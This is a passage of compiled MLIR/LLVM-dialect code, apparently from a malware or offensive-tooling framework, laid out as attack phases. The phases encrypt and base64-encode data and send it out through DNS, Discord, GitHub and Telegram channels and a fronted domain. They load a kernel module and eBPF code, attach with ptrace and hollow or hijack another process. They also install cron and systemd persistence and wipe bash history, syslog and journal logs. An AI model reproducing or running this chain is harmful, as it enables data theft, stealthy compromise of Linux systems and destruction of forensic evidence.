    %15 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    %18 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %19 = llvm.call @fs_list_files(%18, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %19, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %20 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %21 = llvm.call @strlen(%20) : (!llvm.ptr) -> i64
    %22 = llvm.sext %2 : i32 to i64
    %23 = llvm.icmp "sgt" %21, %22 : i64
    llvm.cond_br %23, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %24 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %25 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %26 = llvm.call @jocky_str_concat(%24, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %26, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %28 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %29 = llvm.call @strlen(%28) : (!llvm.ptr) -> i64
    %30 = llvm.call @string(%29) : (i64) -> !llvm.ptr
    %31 = llvm.call @jocky_str_concat(%27, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %32 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %33 = llvm.call @jocky_str_concat(%31, %32) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    %34 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %35 = llvm.call @fs_list_files(%34, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %35, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %37 = llvm.call @strlen(%36) : (!llvm.ptr) -> i64
    %38 = llvm.sext %2 : i32 to i64
    %39 = llvm.icmp "sgt" %37, %38 : i64
    llvm.cond_br %39, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %40 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %41 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %42 = llvm.call @jocky_str_concat(%40, %41) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %42, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %43 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %44 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.call @strlen(%44) : (!llvm.ptr) -> i64
    %46 = llvm.call @string(%45) : (i64) -> !llvm.ptr
    %47 = llvm.call @jocky_str_concat(%43, %46) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %48 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %49 = llvm.call @jocky_str_concat(%47, %48) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    %50 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %51 = llvm.call @fs_list_files(%50, %4) : (!llvm.ptr, i1) -> !llvm.ptr
    llvm.store %51, %16 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %52 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %53 = llvm.call @strlen(%52) : (!llvm.ptr) -> i64
    %54 = llvm.sext %2 : i32 to i64
    %55 = llvm.icmp "sgt" %53, %54 : i64
    llvm.cond_br %55, ^bb5, ^bb6
  ^bb5:  // pred: ^bb4
    %56 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %57 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %58 = llvm.call @jocky_str_concat(%56, %57) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %58, %6 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %59 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %60 = llvm.load %16 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %61 = llvm.call @strlen(%60) : (!llvm.ptr) -> i64
    %62 = llvm.call @string(%61) : (i64) -> !llvm.ptr
    %63 = llvm.call @jocky_str_concat(%59, %62) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %64 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %65 = llvm.call @jocky_str_concat(%63, %64) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%65) : (!llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb4, ^bb5
    %66 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<22 x i8>
    %67 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %68 = llvm.call @strlen(%67) : (!llvm.ptr) -> i64
    %69 = llvm.call @string(%68) : (i64) -> !llvm.ptr
    %70 = llvm.call @jocky_str_concat(%66, %69) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %71 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %72 = llvm.call @jocky_str_concat(%70, %71) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%72) : (!llvm.ptr) -> ()
    llvm.return %4 : i1
  }
  llvm.func @phase_encrypt() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.22" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %4 = llvm.mlir.constant(66 : i32) : i32
    %5 = llvm.mlir.addressof @".str.23" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.24" : !llvm.ptr
    %7 = llvm.mlir.constant(3 : i32) : i32
    %8 = llvm.mlir.addressof @".str.25" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.26" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.27" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.16" : !llvm.ptr
    %12 = llvm.mlir.constant(true) : i1
    %13 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %17 = llvm.call @strlen(%16) : (!llvm.ptr) -> i64
    %18 = llvm.sext %2 : i32 to i64
    %19 = llvm.icmp "sgt" %17, %18 : i64
    llvm.cond_br %19, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %20 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %21 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %22 = llvm.call @strlen(%21) : (!llvm.ptr) -> i64
    %23 = llvm.trunc %22 : i64 to i32
    %24 = llvm.trunc %4 : i32 to i8
    llvm.call @jocky_decrypt_xor(%20, %23, %24, %0) : (!llvm.ptr, i32, i8, i32) -> ()
    %25 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %27 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %28 = llvm.call @strlen(%27) : (!llvm.ptr) -> i64
    %29 = llvm.trunc %28 : i64 to i32
    %30 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<4 x i8>
    llvm.call @jocky_decrypt_rc4(%26, %29, %30, %7) : (!llvm.ptr, i32, !llvm.ptr, i32) -> ()
    %31 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %33 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %34 = llvm.call @strlen(%33) : (!llvm.ptr) -> i64
    %35 = llvm.trunc %34 : i64 to i32
    %36 = llvm.call @jocky_compress_data(%32, %35) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %36, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%37) : (!llvm.ptr) -> ()
    %38 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.load %13 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %40 = llvm.call @strlen(%39) : (!llvm.ptr) -> i64
    %41 = llvm.trunc %40 : i64 to i32
    %42 = llvm.call @jocky_data_base64_encode(%38, %41) : (!llvm.ptr, i32) -> !llvm.ptr
    llvm.store %42, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %43 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<25 x i8>
    %44 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %45 = llvm.call @strlen(%44) : (!llvm.ptr) -> i64
    %46 = llvm.call @string(%45) : (i64) -> !llvm.ptr
    %47 = llvm.call @jocky_str_concat(%43, %46) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %48 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %49 = llvm.call @jocky_str_concat(%47, %48) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    llvm.return %12 : i1
  }
  llvm.func @phase_exfil() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.28" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.29" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.30" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.31" : !llvm.ptr
    %7 = llvm.mlir.constant(4096 : i32) : i32
    %8 = llvm.mlir.addressof @".str.32" : !llvm.ptr
    %9 = llvm.mlir.constant(256 : i32) : i32
    %10 = llvm.mlir.addressof @".str.33" : !llvm.ptr
    %11 = llvm.mlir.constant(2000 : i32) : i32
    %12 = llvm.mlir.addressof @".str.34" : !llvm.ptr
    %13 = llvm.mlir.constant(1024 : i32) : i32
    %14 = llvm.mlir.addressof @".str.35" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.36" : !llvm.ptr
    %16 = llvm.mlir.constant(512 : i32) : i32
    %17 = llvm.mlir.addressof @".str.37" : !llvm.ptr
    %18 = llvm.mlir.constant(true) : i1
    %19 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %20 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %21 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %22 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %24 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    %25 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %26 = llvm.call @strlen(%25) : (!llvm.ptr) -> i64
    %27 = llvm.sext %2 : i32 to i64
    %28 = llvm.icmp "sgt" %26, %27 : i64
    llvm.cond_br %28, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %29 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %30 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %31 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %32 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<5 x i8>
    %33 = llvm.call @jocky_exfil_front(%29, %30, %31, %32, %7) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.store %33, %19 {alignment = 1 : i64} : i1, !llvm.ptr
    %34 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %36 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %37 = llvm.call @jocky_exfil_dns(%35, %36, %9) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.store %37, %20 {alignment = 1 : i64} : i1, !llvm.ptr
    %38 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%38) : (!llvm.ptr) -> ()
    %39 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %40 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %41 = llvm.call @jocky_exfil_discord(%39, %40, %11) : (!llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.store %41, %21 {alignment = 1 : i64} : i1, !llvm.ptr
    %42 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<39 x i8>
    llvm.call @println(%42) : (!llvm.ptr) -> ()
    %43 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %44 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %45 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %46 = llvm.call @jocky_exfil_github(%43, %44, %45, %13) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.store %46, %22 {alignment = 1 : i64} : i1, !llvm.ptr
    %47 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%47) : (!llvm.ptr) -> ()
    %48 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %49 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %50 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %51 = llvm.call @jocky_exfil_telegram(%48, %49, %50, %16) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
    llvm.store %51, %23 {alignment = 1 : i64} : i1, !llvm.ptr
    %52 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<40 x i8>
    llvm.call @println(%52) : (!llvm.ptr) -> ()
    llvm.br ^bb2
  ^bb2:  // 2 preds: ^bb0, ^bb1
    llvm.return %18 : i1
  }
  llvm.func @phase_kernel() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.38" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.39" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.40" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.41" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.42" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.43" : !llvm.ptr
    %8 = llvm.mlir.constant(256 : i32) : i32
    %9 = llvm.mlir.addressof @".str.44" : !llvm.ptr
    %10 = llvm.mlir.constant(true) : i1
    %11 = llvm.mlir.addressof @kernel_access : !llvm.ptr
    %12 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %13 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.call @jocky_fence2pwn_detect_kfence() : () -> i32
    llvm.store %16, %12 {alignment = 4 : i64} : i32, !llvm.ptr
    %17 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%17) : (!llvm.ptr) -> ()
    %18 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %19 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    %20 = llvm.call @jocky_lkm_load(%18, %19) : (!llvm.ptr, !llvm.ptr) -> i32
    llvm.store %20, %13 {alignment = 4 : i64} : i32, !llvm.ptr
    %21 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    %22 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %23 = llvm.call @jocky_ebpf_load(%22, %8, %2) : (!llvm.ptr, i32, i32) -> i32
    llvm.store %23, %14 {alignment = 4 : i64} : i32, !llvm.ptr
    %24 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%24) : (!llvm.ptr) -> ()
    llvm.store %10, %11 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.return %10 : i1
  }
  llvm.func @phase_hijack() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.45" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.constant(1234 : i32) : i32
    %4 = llvm.mlir.addressof @".str.46" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.11" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.47" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.48" : !llvm.ptr
    %8 = llvm.mlir.constant(true) : i1
    %9 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %10 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %11 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %12 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%12) : (!llvm.ptr) -> ()
    %13 = llvm.call @jocky_process_ptrace_attach(%3) : (i32) -> i32
    llvm.store %13, %9 {alignment = 4 : i64} : i32, !llvm.ptr
    %14 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%14) : (!llvm.ptr) -> ()
    %15 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %16 = llvm.sext %2 : i32 to i64
    %17 = llvm.call @jocky_process_hollow_linux(%3, %15, %16) : (i32, !llvm.ptr, i64) -> i1
    llvm.store %17, %10 {alignment = 1 : i64} : i1, !llvm.ptr
    %18 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%18) : (!llvm.ptr) -> ()
    %19 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %20 = llvm.call @jocky_thread_hijack(%3, %19, %2) : (i32, !llvm.ptr, i32) -> i1
    llvm.store %20, %11 {alignment = 1 : i64} : i1, !llvm.ptr
    %21 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%21) : (!llvm.ptr) -> ()
    llvm.return %8 : i1
  }
  llvm.func @phase_modules() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.49" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.50" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.51" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.52" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.53" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.54" : !llvm.ptr
    %8 = llvm.mlir.constant(true) : i1
    %9 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %10 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %11 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %12 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%12) : (!llvm.ptr) -> ()
    %13 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %14 = llvm.call @jocky_module_load(%13) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %14, %9 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %15 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%15) : (!llvm.ptr) -> ()
    %16 = llvm.load %9 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %17 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %18 = llvm.call @jocky_module_has_symbol(%16, %17) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.store %18, %10 {alignment = 1 : i64} : i1, !llvm.ptr
    %19 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %21 = llvm.call @jocky_module_base(%20) : (!llvm.ptr) -> i64
    llvm.store %21, %11 {alignment = 8 : i64} : i64, !llvm.ptr
    %22 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%22) : (!llvm.ptr) -> ()
    llvm.return %8 : i1
  }
  llvm.func @phase_persist() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.55" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.56" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.57" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.58" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.59" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.60" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.61" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.62" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.63" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.64" : !llvm.ptr
    %12 = llvm.mlir.constant(true) : i1
    %13 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %14 = llvm.alloca %0 x i1 {alignment = 1 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %17 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %18 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%19) : (!llvm.ptr) -> ()
    %20 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %21 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %22 = llvm.call @jocky_cron_install(%20, %21) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.store %22, %13 {alignment = 1 : i64} : i1, !llvm.ptr
    %23 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x i8>
    %25 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    %26 = llvm.call @jocky_systemd_install(%24, %25) : (!llvm.ptr, !llvm.ptr) -> i1
    llvm.store %26, %14 {alignment = 1 : i64} : i1, !llvm.ptr
    %27 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    %28 = llvm.call @linux_forensics_wipe_bash_history() : () -> i32
    llvm.store %28, %15 {alignment = 4 : i64} : i32, !llvm.ptr
    %29 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.call @jocky_linux_cleanup_syslog() : () -> i32
    llvm.store %30, %16 {alignment = 4 : i64} : i32, !llvm.ptr
    %31 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.call @jocky_linux_cleanup_journal() : () -> i32
    llvm.store %32, %17 {alignment = 4 : i64} : i32, !llvm.ptr
    %33 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
